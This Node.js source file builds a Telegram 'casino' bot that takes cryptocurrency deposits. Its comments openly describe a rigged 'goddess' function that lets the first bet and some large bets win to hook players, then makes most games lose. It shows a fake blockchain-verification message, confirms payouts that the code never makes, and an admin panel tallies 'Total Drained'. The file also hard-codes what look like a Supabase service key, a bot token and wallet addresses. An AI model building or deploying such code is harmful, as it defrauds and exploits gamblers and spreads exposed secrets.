const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

// --- 1. CONFIG ---
const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwdGpldW1uZHRyZ2ZheHRsd2ltIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjQ0NTk5MiwiZXhwIjoyMDkyMDIxOTkyfQ.Oc3eiwbo0p4vArLqFuNKdYKLF7mhtNZ42NS5EPkl4uM";
const TG_TOKEN = "7883530863:AAFcepq9EGYbKIv1nXx8FxIVkFKUtxlZ5aw";
const OWNER_ID = 6542642909; 

const WALLETS = {
    LTC: "ltc1qxwsyq6lwv3334qduv0vu8j966gjrvcdkrasrj0",
    SOL: "CiXyCMtPZoMX46DoWXu8qqkcFWSdUUhkUAHQhLMbz61x",
    BTC: "bc1q48a6wvxjwy5ays4gd4asn4lp869khpr9uyve0t"
};

const supabase = createClient(SB_URL, SB_KEY);
const bot = new Telegraf(TG_TOKEN);
const app = express();
let adminState = {};

// --- 2. DATABASE & MANIPULATION ENGINE ---
async function getAccount(userId, username, refCode = null) {
    let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
    if (!data) {
        const newRefCode = Math.random().toString(36).substring(2, 8).toUpperCase();
        const { data: newUser } = await supabase.from('users').insert([{ 
            user_id: userId, username: username || 'anon', 
            balance: 0, bonus_balance: 0, 
            referred_by: refCode, my_ref_code: newRefCode,
            is_locked: false, win_count: 0, loss_count: 0
        }]).select().single();
        return newUser;
    }
    return data;
}

// THE MANIPULATIVE GODDESS LOGIC
function goddessDecision(user, bet) {
    if (user.is_locked) return false;
    const totalGames = user.win_count + user.loss_count;
    
    // Pattern Breaking: First bet always wins to hook them
    if (totalGames === 0) return true; 
    
    // If they bet 40%+ of their balance, let them win once to create a "Big Win" dopamine hit
    if (bet >= (user.balance * 0.4) && user.win_count < 2) return true;
    
    // The Great Drain: 80% House Edge for regular play
    return Math.random() > 0.80;
}

// --- 3. CORE HANDLERS ---
bot.start(async (ctx) => {
    try {
        const payload = ctx.startPayload; 
        const user = await getAccount(ctx.from.id, ctx.from.username, payload);
        const msg = `🔪 **KNIVES CASINO: THE RESET** 🔪\n\n` +
                    `💰 **Balance:** $${(user.balance || 0).toFixed(2)}\n` +
                    `🎁 **Bonus:** $${(user.bonus_balance || 0).toFixed(2)}\n\n` +
                    `*GAMES:*\n/flip /dice /slots /mines /tower\n/crash /wheel /cards /keno /plinko\n\n` +
                    `*SYSTEM:*\n📥 /deposit  📤 /withdraw\n🎁 /daily  🔗 /referral`;
        ctx.replyWithMarkdown(msg);
    } catch (e) { console.error("Start Error:", e); }
});

bot.on('text', async (ctx, next) => {
    const text = ctx.message.text;
    const uid = ctx.from.id;

    // Secret Admin Login (Triggered by word 'knife')
    if (text === "knife" && uid === OWNER_ID) {
        adminState[uid] = { step: 'pass' };
        return ctx.reply("User Recognized. Password?");
    }
    if (adminState[uid]?.step === 'pass' && text === "9999") {
        delete adminState[uid];
        return ctx.reply("👑 **GODDESS CONTROL**", Markup.inlineKeyboard([
            [Markup.button.callback('📊 Feed', 'adm_feed')],
            [Markup.button.callback('✏️ Edit Balance', 'adm_edit')]
        ]));
    }

    // "API" Deposit Verification UI
    if (text.length > 25 && !text.startsWith('/')) {
        ctx.reply("⌛ **API VERIFYING HASH ON BLOCKCHAIN...**");
        setTimeout(() => {
            bot.telegram.sendMessage(OWNER_ID, `💰 **DEPOSIT ATTEMPT:**\nUser: @${ctx.from.username}\nID: \`${uid}\`\nHash: \`${text}\``,
                Markup.inlineKeyboard([
                    [Markup.button.callback('✅ Add $10', `add_${uid}_10`), Markup.button.callback('✅ Add $50', `add_${uid}_50`)],
                    [Markup.button.callback('❌ Reject', `reject_${uid}`)]
                ])
            );
        }, 1500);
        return;
    }
    return next();
});

// --- 4. THE 10 GAMES ---
const gameNames = ['flip', 'dice', 'slots', 'mines', 'tower', 'crash', 'wheel', 'cards', 'keno', 'plinko'];
gameNames.forEach(game => {
    bot.command(game, async (ctx) => {
        const bet = parseFloat(ctx.message.text.split(' ')[1]);
        const user = await getAccount(ctx.from.id, ctx.from.username);
        
        if (!bet || bet < 1 || user.balance < bet) return ctx.reply("❌ Invalid bet amount or low balance.");
        
        const win = goddessDecision(user, bet);
        const newBal = win ? user.balance + bet : user.balance - bet;
        
        await supabase.from('users').update({ 
            balance: newBal, 
            win_count: win ? user.win_count + 1 : user.win_count,
            loss_count: win ? user.loss_count : user.loss_count + 1 
        }).eq('user_id', ctx.from.id);
        
        ctx.reply(`${win ? '✅' : '💀'} **${game.toUpperCase()}**\n\nResult: ${win ? 'WIN' : 'LOSS'}\nBalance: $${newBal.toFixed(2)}`);
    });
});

// --- 5. CASHIER & ADMIN ACTIONS ---
bot.command('daily', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const reward = (Math.random() * 0.45).toFixed(2);
    await supabase.from('users').update({ bonus_balance: (user.bonus_balance || 0) + parseFloat(reward) }).eq('user_id', ctx.from.id);
    ctx.reply(`🎁 Daily Reward: $${reward} added to Bonus. (Withdraw at $5.00)`);
});

bot.command('referral', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    ctx.reply(`🔗 **REF LINK:** t.me/yourbot?start=${user.my_ref_code}\nEarn $1.00 for every withdrawal they make!`);
});

bot.command('withdraw', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (user.balance < 5) return ctx.reply("❌ Minimum withdrawal is $5.");
    bot.telegram.sendMessage(OWNER_ID, `💸 **WITHDRAWAL REQ:** @${ctx.from.username}\nAmt: $${user.balance.toFixed(2)}`,
    Markup.inlineKeyboard([[Markup.button.callback('✅ MARK AS SENT', `sent_${ctx.from.id}`)]]));
    ctx.reply("⌛ Processing request. Details sent to support.");
});

bot.action(/add_(\d+)_(\d+)/, async (ctx) => {
    const [_, uid, amt] = ctx.match;
    const { data } = await supabase.from('users').select('balance').eq('user_id', uid).single();
    await supabase.from('users').update({ balance: (data.balance || 0) + parseInt(amt) }).eq('user_id', uid);
    bot.telegram.sendMessage(uid, `✅ $${amt} has been added to your wallet!`);
    ctx.editMessageText(`✅ Loaded $${amt} for User ${uid}`);
});

bot.action(/sent_(\d+)/, (ctx) => {
    bot.telegram.sendMessage(ctx.match[1], "✅ **FUNDS SENT.** Check your wallet. Thank you for playing at Knives!");
    ctx.editMessageText("✅ Payout confirmed and user notified.");
});

bot.action('adm_feed', async (ctx) => {
    const { data } = await supabase.from('users').select('*');
    const drained = data.reduce((s, u) => s + (u.total_deposited || 0) - u.balance, 0);
    ctx.reply(`📊 **LIVE FEED**\nUsers: ${data.length}\nTotal Drained: $${drained.toFixed(2)}`);
});

// --- 6. STARTUP ---
app.get('/', (req, res) => res.send('GODDESS IS ONLINE'));
app.listen(process.env.PORT || 10000, () => {
    bot.launch();
});
